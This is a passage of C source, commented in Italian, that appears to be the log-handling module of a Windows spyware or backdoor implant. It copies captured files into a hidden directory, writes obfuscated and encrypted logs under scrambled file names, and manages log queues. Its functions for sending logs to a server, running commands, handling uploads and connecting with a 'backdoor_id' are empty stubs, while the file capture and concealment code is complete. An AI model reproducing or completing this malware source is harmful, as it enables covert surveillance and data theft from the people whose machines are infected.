	hsrc = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hsrc == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		SAFE_FREE(temp_buff);
		return FALSE;
	}

	// Controlla che ci sia ancora spazio per scrivere su disco
	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
		SAFE_FREE(temp_buff);
		SAFE_FREE(log_file_header);
		CloseHandle(hsrc);
		return FALSE;
	}

	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (hdst == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		SAFE_FREE(temp_buff);
		CloseHandle(hsrc);
		return FALSE;
	}
	// Se il file e' stato sovrascritto (e con successo) restituisce la quota disco
	// recuperata.
	log_free_space += existent_file_size;

	// Scrive l'header nel file
	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
		CloseHandle(hsrc);
		CloseHandle(hdst);
		SAFE_FREE(log_file_header);
		SAFE_FREE(temp_buff);
		return FALSE;
	}
	if (log_free_space >= header_len)
		log_free_space -= header_len;
	SAFE_FREE(log_file_header);
	FNC(FlushFileBuffers)(hdst);

	// Cicla finche riesce a leggere (e/o a scrivere)
	LOOP {
		dwRead = 0;
		if (!FNC(ReadFile)(hsrc, temp_buff, CRYPT_COPY_BUF_LEN, &dwRead, NULL) )
			break;
		// La Log_WriteFile sottrae la quota disco di ogni scrittura
		// Esce perche' quando il file da leggere e' finito dwRead e' 0
		// e Log_WriteFile ritorna FALSE se gli fai scrivere 0 byte
		if (!Log_WriteFile(hdst, temp_buff, dwRead))
			break;
	}

	SAFE_FREE(temp_buff);
	CloseHandle(hsrc);
	CloseHandle(hdst);
	return TRUE;
}

// Crea un file di log di tipo "file capture" vuoto, nel caso non sia stato possibile catturarlo per size 
// Specifica la size nel nome del file stesso
BOOL Log_CryptCopyEmptyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_name, DWORD existent_file_len, DWORD agent_tag)
{
	HANDLE hdst;
	DWORD dwRead;
	BY_HANDLE_FILE_INFORMATION dst_info;
	DWORD existent_file_size = 0;
	BYTE *file_additional_data;
	BYTE *log_file_header;
	FileAdditionalData *file_additiona_data_header;
	DWORD header_len;
	WCHAR to_display[MAX_PATH];

	if (display_name) 
		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", display_name, existent_file_len);		
	else
		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", src_path, existent_file_len);		

	// Crea l'header da scrivere nel file
	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
		return FALSE;
	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
	SAFE_FREE(file_additional_data);
	if (!log_file_header)
		return FALSE;
	
	// Prende le info del file destinazione (se esiste)
	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hdst != INVALID_HANDLE_VALUE) {
		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
			existent_file_size = dst_info.nFileSizeLow;
		}
		CloseHandle(hdst);
	}

	// Controlla che ci sia ancora spazio per scrivere su disco
	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
		SAFE_FREE(log_file_header);
		return FALSE;
	}

	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (hdst == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		return FALSE;
	}
	// Se il file e' stato sovrascritto (e con successo) restituisce la quota disco
	// recuperata.
	log_free_space += existent_file_size;

	// Scrive l'header nel file
	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
		CloseHandle(hdst);
		SAFE_FREE(log_file_header);
		return FALSE;
	}
	if (log_free_space >= header_len)
		log_free_space -= header_len;

	SAFE_FREE(log_file_header);
	FNC(FlushFileBuffers)(hdst);
	CloseHandle(hdst);
	return TRUE;
}


// Copia il file nella directory nascosta. Fa un hash del path.
// File con path uguale vengono sovrascritti. Effettua la copia solo
// se la destinazione non ha la stessa data della sorgente.
BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD agent_tag)
{


	return TRUE;
}

// Scrive in un file di log.
// Controlla la quota disco
// Torna TRUE se ha successo
// E' conforme al nuovo formato di log (lunghezza in cleartext + blocco cifrato)
BOOL Log_WriteFile(HANDLE handle, BYTE *clear_buffer, DWORD clear_len)
{
	DWORD dwTmp;
	BOOL ret_val;
	DWORD crypt_len = 0;
	BYTE *crypt_buffer = NULL;

	// Controlla che la richiesta sia valida
	if (handle == INVALID_HANDLE_VALUE || clear_len == 0 || clear_buffer == NULL)
		return FALSE;

	// Offusca il buffer. La funzione torna una copia del buffer
	// gia' offuscata, e la dimensione di essa. La copia va
	// liberata (se e' stata allocata).
	crypt_buffer = LOG_Obfuscate(clear_buffer, clear_len, &crypt_len);

	// Controlla lo spazio disco rimasto e che la cifratura
	// sia andata a buon fine
	if (!crypt_buffer || crypt_len > log_free_space) {
		SAFE_FREE(crypt_buffer);
		return FALSE;
	}

	ret_val = FNC(WriteFile)(handle, crypt_buffer, crypt_len, &dwTmp,  NULL);
	SAFE_FREE(crypt_buffer);

	// Se ha scritto con successo, diminuisce lo spazio residuo
	// XXX Potrebbe esserci una race condition e log_free_space 
	// diventerebbe enorme...(abbastanza remoto)
	// Col doppio check diminuisco le possiblita' di race 
	// condition ulteriormente.
	if (ret_val && crypt_len<=log_free_space)
		log_free_space -= crypt_len;

	// Cancellata per questioni di performance di skype
	//FNC(FlushFileBuffers)(handle);

	return ret_val;
}
BOOL Log_WriteFile2(HANDLE handle, BYTE *clear_buffer, DWORD clear_len)
{
	DWORD dwTmp;
	BOOL ret_val;
	DWORD crypt_len = 0;
	BYTE *crypt_buffer = NULL;

	// Controlla che la richiesta sia valida
	if (handle == INVALID_HANDLE_VALUE || clear_len == 0 || clear_buffer == NULL)
		return FALSE;



	ret_val = FNC(WriteFile)(handle, clear_buffer, clear_len, &dwTmp, NULL);

	if (ret_val && clear_len <= log_free_space)
		log_free_space -= clear_len;

	// Cancellata per questioni di performance di skype
	//FNC(FlushFileBuffers)(handle);

	return ret_val;
}

// Elimina da una stringa tutti i caratteri non 
// alfanumerici
void Log_Sanitize(char *name)
{
	unsigned char *ptr;
	for(ptr=(unsigned char *)name; *ptr!=0; ptr++)
		if (*ptr != ' ' && *ptr != '-' && *ptr != '.' && *ptr != '@' && *ptr != '+') 
			if (*ptr<'0' || (*ptr>'9' && *ptr<'A') || (*ptr>'Z' && *ptr<'a') || *ptr>'z')
				*ptr = ' ';
}


// Cancella i log troppo vecchi o troppo "ciccioni"
#define SECS_TO_FT_MULT 10000000
void LOG_Purge(long long f_time, DWORD size)
{
	return;
}


// Scambia la coda di log attiva con quella inattiva
void Log_SwitchQueue()
{
	char search_mask[64];
	char *scrambled_search;
	char DirSpec[DLLNAMELEN];
	char DestSpec[DLLNAMELEN];
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// La coda attiva e' sempre la 0!
	log_active_queue = 0;

	sprintf(search_mask, "%.1XLOG*.log", log_active_queue);
	scrambled_search = LOG_ScrambleName2(search_mask, crypt_key[0], TRUE);
	if (!scrambled_search)
		return;

	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
	// quindi posso usare le wildcard).
	HM_CompletePath(scrambled_search, DirSpec);
	SAFE_FREE(scrambled_search);

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			HM_CompletePath(FindFileData.cFileName, DirSpec); // Nome File sorgente in DirSpec
			memcpy(DestSpec, DirSpec, sizeof(DestSpec));
			scrambled_search = LOG_ScrambleName2("1", crypt_key[0], TRUE);
			if (!scrambled_search)
				break;

			char *q = strrchr(DestSpec, '\\');
			if (q) {
				q++;
				*q = scrambled_search[0]; // Nome File destinazione in DestSpec
				SAFE_FREE(scrambled_search);
			} else {
				SAFE_FREE(scrambled_search);
				break;
			}
			MoveFile(DirSpec, DestSpec);					

		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}

	// XXX Cerca di switchare anche i log con il vecchio scrambling
	sprintf(search_mask, "%.1XLOG*.log", log_active_queue);
	scrambled_search = LOG_ScrambleName(search_mask, crypt_key[0], TRUE);
	if (!scrambled_search)
		return;

	// Effettua la ricerca dei nomi dei file scramblati (* e . rimangono invariati
	// quindi posso usare le wildcard).
	HM_CompletePath(scrambled_search, DirSpec);
	SAFE_FREE(scrambled_search);

	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			HM_CompletePath(FindFileData.cFileName, DirSpec); // Nome File sorgente in DirSpec
			memcpy(DestSpec, DirSpec, sizeof(DestSpec));
			scrambled_search = LOG_ScrambleName("1", crypt_key[0], TRUE);
			if (!scrambled_search)
				break;

			char *q = strrchr(DestSpec, '\\');
			if (q) {
				q++;
				*q = scrambled_search[0]; // Nome File destinazione in DestSpec
				SAFE_FREE(scrambled_search);
			} else {
				SAFE_FREE(scrambled_search);
				break;
			}
			MoveFile(DirSpec, DestSpec);					

		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}
}

// Funzione esportata per permettere di loggare una bitmap 
#include "HM_BitmapCommon.h"
typedef struct _PrintAdditionalData {
	UINT uVersion;
		#define LOG_PRINT_VERSION 2009031201
	UINT uDocumentNameLen;
} PrintAdditionalData;

void __stdcall Log_PrintDC(WCHAR *doc_name, HDC print_dc, HBITMAP print_bmp, DWORD x_dim, DWORD y_dim)
{
	return;
}


//------------------- FUNZIONI PER LA SPEDIZIONE DEI LOG ---------------

BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
{

	return TRUE;
}

// Invia la coda dei log al server
// I file vuoti vengono semplicemente cancellati
// Il band limit e' in byte al secondo
BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
{

	return TRUE;
}

// Se in wildpath e' presente una wildcard la sosituisce con file_name
// e mette comunque tutto in dest_path.
// Torna dest_path.
WCHAR *LOG_CompleteWild(WCHAR *wild_path, WCHAR *file_name, WCHAR *dest_path)
{
	WCHAR *wild_ptr;
	
	dest_path[0] = 0; // Termina per sicurezza paranoica...
	wcscpy(dest_path, wild_path);
	wild_ptr = wcsrchr(dest_path, L'\\');
	// Sostituisce all'ultimo slash
	if (wild_ptr) {
		wild_ptr++;
		wcscpy(wild_ptr, file_name);
	}

	return dest_path;
}

void UpdateDriver(char *source_path)
{
	char sys_path[DLLNAMELEN];
	char comp_path[DLLNAMELEN*2];
	PVOID old_value;
	/*
	if (!IsDriverRunning(DRIVER_NAME_W))
		return;
	
	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
		return;
	sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\drivers\\", DRIVER_NAME);
	
	old_value = DisableWow64Fs();
	CopyFile(source_path, comp_path, FALSE);	
	RevertWow64Fs(old_value);*/
	return;
}

// I file uploadati vengono messi nella working dir.
// Torna FALSE se qualcosa fallisce.
// Gestisce anche la ricezione del codec e degli update.
// Gestisce anche gli upgrade
BOOL LOG_HandleUpload(BOOL is_upload)
{


	return TRUE;
}

// Gestisce le richieste di download (creando dei log di quel tipo)
BOOL LOG_HandleDownload()
{

	return TRUE;
}

// Gestisce le richieste di filesystem (creando dei log di quel tipo)
BOOL LOG_HandleFileSystem()
{

	return TRUE;
}

// Gestisce le richieste di esecuzione diretta di comandi
BOOL LOG_HandleCommands()
{

	return TRUE;
}

// Legge (se c'e') un nuovo file di configurazione
BOOL LOG_ReceiveNewConf()
{

	return TRUE; 
}


// Inizializza la connessione, esegue AUTH e ID
// Se torna FALSE la sync si deve interrompere
// Se torna FALSE e uninstall==TRUE, si deve disinstallare
BOOL LOG_StartLogConnection(char *asp_server, char *backdoor_id, BOOL *uninstall, long long *time_date, DWORD *availables, DWORD size_avail)
{

	return TRUE;
}


// Chiude la connessione per l'invio dei log
void LOG_CloseLogConnection()
{
	return;
}